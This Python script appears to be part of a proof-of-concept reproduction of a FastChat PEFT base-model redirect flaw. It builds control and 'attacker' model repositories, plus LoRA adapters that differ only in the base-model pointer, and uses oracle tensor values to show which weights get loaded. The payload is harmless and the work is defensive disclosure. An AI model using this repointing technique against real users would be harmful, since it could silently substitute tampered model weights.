"""Build the malicious and control model packages for the
``fastchat.peft.base_model_redirect`` reproduction.

What is built (all under ``poc/work/``)
--------------------------------------
1. Two *data-only* second-hop base repositories, served later by ``mock_hub.py``:

   work/hub/mbe2e-control/fastchat-base/    config.json  generation_config.json
                                            model.safetensors
                                            tokenizer.json  tokenizer_config.json
                                            special_tokens_map.json
   work/hub/mbe2e-attacker/fastchat-base/   (same file list)

   No ``.py``, no ``auto_map``, no pickle, no sidecar program: the two
   repositories are byte-identical except for two tensor values.

   - ``model.embed_tokens.weight[0, 0]`` -- the *measurement oracle*: 0.25 in the
     control repository, 0.75 in the attacker repository.  The LoRA tensors of the
     adapter below are all zero, so a merge cannot change this scalar; reading it
     back from a loaded model tells us which repository's weights were loaded.
   - one row of ``lm_head.weight`` -- the *answer oracle*: the greedy first token
     of the tiny model is forced to the token that spells out its own repository
     id ("mbe2e-control/fastchat-base" vs "mbe2e-attacker/fastchat-base"), so the
     real FastChat CLI prints the identity of the repository it took the weights
     from.  Both repositories share one tokenizer vocabulary that contains both
     strings as single tokens.

2. Two PEFT LoRA adapter packages produced with PEFT's own ``save_pretrained()``:

   work/adapter_benign_peft/  adapter_config.json -> mbe2e-control/fastchat-base
   work/adapter_attack_peft/  adapter_config.json -> mbe2e-attacker/fastchat-base

   The two directories are byte-identical except for that one string;
   ``make_poc.py`` prints the SHA-256 of ``adapter_model.safetensors`` for both to
   prove the adapter weights are the same file.
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import sys

import torch
import transformers

try:  # keep the console output readable for the evidence screenshots
    transformers.utils.logging.disable_progress_bar()
    transformers.utils.logging.set_verbosity_error()
except Exception:  # noqa: BLE001
    pass

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
HUB = os.path.join(WORK, "hub")
PINNED = os.path.join(HERE, "FastChat-587d5cf")
if PINNED not in sys.path:  # the exact checkout whose loader is being reproduced
    sys.path.insert(0, PINNED)

from fastchat.conversation import get_conv_template  # noqa: E402

CONTROL_REPO = "mbe2e-control/fastchat-base"
ATTACK_REPO = "mbe2e-attacker/fastchat-base"
CONTROL_ORACLE = 0.25
ATTACK_ORACLE = 0.75
ORACLE_INDEX = (0, 0)
SEED = 1234
# the line the victim types at the CLI's "Human:" prompt (see run_repro.py)
USER_MESSAGE = "Hello"

EXTRA_WORDS = ["Hello", "world", "test", "answer"]


def prompt_text() -> str:
    """Reproduce the exact prompt FastChat builds for one chat turn.

    ``chat_loop`` -> ``get_conversation_template(model_path)`` -> the PEFT adapter
    delegates to the base model's template ("one_shot"), then appends the user
    message and an empty assistant turn.
    """
    conv = get_conv_template("one_shot")
    conv.append_message(conv.roles[0], USER_MESSAGE)
    conv.append_message(conv.roles[1], None)
    return conv.get_prompt()


def build_tokenizer(prompt: str):
    """Word-level fast tokenizer over the words of the prompt + both repo ids."""
    from tokenizers import Tokenizer, models, pre_tokenizers
    from transformers import PreTrainedTokenizerFast

    vocab = {"<unk>": 0, "<s>": 1, "</s>": 2, "<pad>": 3}
    words = []
    for word in prompt.split() + [CONTROL_REPO, ATTACK_REPO] + EXTRA_WORDS:
        if word not in words:
            words.append(word)
    for word in words:
        vocab[word] = len(vocab)

    backend = Tokenizer(models.WordLevel(vocab=vocab, unk_token="<unk>"))
    backend.pre_tokenizer = pre_tokenizers.Whitespace()
    return PreTrainedTokenizerFast(
        tokenizer_object=backend,
        unk_token="<unk>",
        bos_token="<s>",
        eos_token="</s>",
        pad_token="<pad>",
        model_max_length=512,
    )


def build_base_repo(repo_id: str, oracle: float, prompt_ids, tokenizer) -> str:
    """Write one data-only base repository and return its directory."""
    from transformers import LlamaConfig, LlamaForCausalLM

    repo_dir = os.path.join(HUB, *repo_id.split("/"))
    shutil.rmtree(repo_dir, ignore_errors=True)
    os.makedirs(repo_dir)

    config = LlamaConfig(
        vocab_size=len(tokenizer),  # tensor data, not the tool's business
        hidden_size=32,
        intermediate_size=64,
        num_hidden_layers=2,
        num_attention_heads=4,
        num_key_value_heads=2,
        max_position_embeddings=512,
        tie_word_embeddings=False,
    )
    torch.manual_seed(SEED)  # identical weights for both repositories
    model = LlamaForCausalLM(config).eval()

    with torch.no_grad():
        # (1) the measurement oracle: one scalar of the embedding matrix
        model.get_parameter("model.embed_tokens.weight")[ORACLE_INDEX] = oracle

        # (2) the answer oracle: make the greedy first token spell out this very
        #     repository id, for the exact prompt the CLI will send.
        ids = torch.tensor([prompt_ids])
        hidden = model(input_ids=ids, output_hidden_states=True).hidden_states[-1]
        last = hidden[0, -1]
        row = tokenizer.convert_tokens_to_ids(repo_id)
        assert row != tokenizer.unk_token_id, repo_id
        model.lm_head.weight.data[row] = 1000.0 * last / last.norm()

        top = int(model(input_ids=ids).logits[0, -1].argmax())
        assert tokenizer.convert_ids_to_tokens(top) == repo_id, (
            tokenizer.convert_ids_to_tokens(top),
            repo_id,
        )

    model.save_pretrained(repo_dir, safe_serialization=True)
    model.generation_config.save_pretrained(repo_dir)
    tokenizer.save_pretrained(repo_dir)

    files = sorted(os.listdir(repo_dir))
    readback = float(model.get_parameter("model.embed_tokens.weight")[ORACLE_INDEX])
    assert readback == oracle, readback
    print("  repo %-32s oracle=%s  answers=%-28s files=%s"
          % (repo_id, readback, tokenizer.convert_ids_to_tokens(top),
             ",".join(files)))
    return repo_dir


def build_adapter(base_repo_dir: str, out_dir: str) -> None:
    """Wrap the base model with a rank-1, all-zero LoRA adapter and save it."""
    from peft import LoraConfig, get_peft_model
    from transformers import AutoModelForCausalLM

    shutil.rmtree(out_dir, ignore_errors=True)
    base = AutoModelForCausalLM.from_pretrained(
        base_repo_dir, torch_dtype=torch.float32, local_files_only=True
    )
    lora_cfg = LoraConfig(
        r=1,
        lora_alpha=1,
        lora_dropout=0.0,
        bias="none",
        target_modules=["q_proj"],
        task_type="CAUSAL_LM",
    )
    peft_model = get_peft_model(base, lora_cfg)
    with torch.no_grad():
        for name, param in peft_model.named_parameters():
            if "lora_" in name:
                param.zero_()
    peft_model.save_pretrained(out_dir)


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def tensor_diff(left_path: str, right_path: str) -> str:
    """Describe where two safetensors files differ (element counts per tensor)."""
    from safetensors.torch import load_file

    left, right = load_file(left_path), load_file(right_path)
    assert sorted(left) == sorted(right), "different tensor keys"
    diffs = []
    for key in sorted(left):
        n = int((left[key] != right[key]).sum())
        if n:
            diffs.append("%s(%d/%d)" % (key, n, left[key].numel()))
    return ", ".join(diffs) if diffs else "no differing element"


def write_sha256sums() -> int:
    entries = []
    for root, _dirs, files in os.walk(WORK):
        for name in files:
            p = os.path.join(root, name)
            rel = os.path.relpath(p, WORK).replace("\\", "/")
            entries.append((rel, sha256(p)))
    entries.sort()
    out = os.path.join(WORK, "SHA256SUMS.txt")
    with open(out, "w", encoding="utf-8") as f:
        for rel, digest in entries:
            f.write("%s  %s\n" % (digest, rel))
    return len(entries)


def main() -> int:
    import peft

    print("building packages under %s" % WORK)
    print("transformers %s / peft %s / torch %s"
          % (transformers.__version__, peft.__version__, torch.__version__))
    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(HUB)

    prompt = prompt_text()
    tokenizer = build_tokenizer(prompt)
    prompt_ids = tokenizer(prompt).input_ids
    lines = prompt.splitlines()
    print("\nFastChat prompt for one turn (%d ids, one_shot template):" % len(prompt_ids))
    shown = lines if len(lines) <= 6 else lines[:2] + ["... (%d lines of one-shot "
             "example) ..." % (len(lines) - 5)] + lines[-3:]
    for line in shown:
        print("  | %s" % line)

    print("\n[1/3] second-hop base repositories (data only: json + safetensors)")
    control_dir = build_base_repo(CONTROL_REPO, CONTROL_ORACLE, prompt_ids, tokenizer)
    attack_dir = build_base_repo(ATTACK_REPO, ATTACK_ORACLE, prompt_ids, tokenizer)
    same = {}
    for name in sorted(os.listdir(control_dir)):
        same[name] = sha256(os.path.join(control_dir, name)) == \
            sha256(os.path.join(attack_dir, name))
    print("  identical in both repos: %s"
          % ", ".join("%s=%s" % (k, v) for k, v in same.items()))
    # every file except the weights is byte-identical; the weights differ only in
    # the two oracle values
    assert all(v for k, v in same.items() if k != "model.safetensors"), same
    assert not same["model.safetensors"], same
    print("  model.safetensors differences: %s"
          % tensor_diff(os.path.join(control_dir, "model.safetensors"),
                        os.path.join(attack_dir, "model.safetensors")))

    print("\n[2/3] LoRA adapters (rank 1, zero tensors, PEFT save_pretrained)")
    benign_dir = os.path.join(WORK, "adapter_benign_peft")
    attack_adapter_dir = os.path.join(WORK, "adapter_attack_peft")
    build_adapter(control_dir, benign_dir)
    # copy the benign adapter byte-for-byte, then repoint only the base pointer
    shutil.copytree(benign_dir, attack_adapter_dir)

    def repoint(adapter_dir: str, base_pointer: str) -> None:
        cfg_path = os.path.join(adapter_dir, "adapter_config.json")
        with open(cfg_path, encoding="utf-8") as f:
            cfg = json.load(f)
        cfg["base_model_name_or_path"] = base_pointer
        with open(cfg_path, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
            f.write("\n")
        print("  adapter %-22s -> %s" % (os.path.basename(adapter_dir), base_pointer))

    repoint(benign_dir, CONTROL_REPO)
    repoint(attack_adapter_dir, ATTACK_REPO)

    w_benign = sha256(os.path.join(benign_dir, "adapter_model.safetensors"))
    w_attack = sha256(os.path.join(attack_adapter_dir, "adapter_model.safetensors"))
    print("  adapter_model.safetensors sha256 identical=%s" % (w_benign == w_attack))
    print("  %s" % w_benign)

    print("\n[3/3] package hashes")
    n = write_sha256sums()
    print("  work/SHA256SUMS.txt: %d entries" % n)

    print("\n[summary]")
    for repo_id, oracle in ((CONTROL_REPO, CONTROL_ORACLE), (ATTACK_REPO, ATTACK_ORACLE)):
        repo_dir = os.path.join(HUB, *repo_id.split("/"))
        names = sorted(os.listdir(repo_dir))
        code = [f for f in names if f.endswith(".py") or f == "auto_map"]
        print("  second-hop repo: %-32s oracle=%s files=%d code_files=%d"
              % (repo_id, oracle, len(names), len(code)))
    print("  byte-identical in both repos: %s"
          % ", ".join(sorted(k for k, v in same.items() if v)))
    print("  differing tensor elements   : %s"
          % tensor_diff(os.path.join(control_dir, "model.safetensors"),
                        os.path.join(attack_dir, "model.safetensors")))
    print("  adapter package: adapter_benign_peft -> %s" % CONTROL_REPO)
    print("  adapter package: adapter_attack_peft -> %s" % ATTACK_REPO)
    print("  adapter_model.safetensors identical : %s" % (w_benign == w_attack))
    print("  adapter_model.safetensors sha256    : %s" % w_benign)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
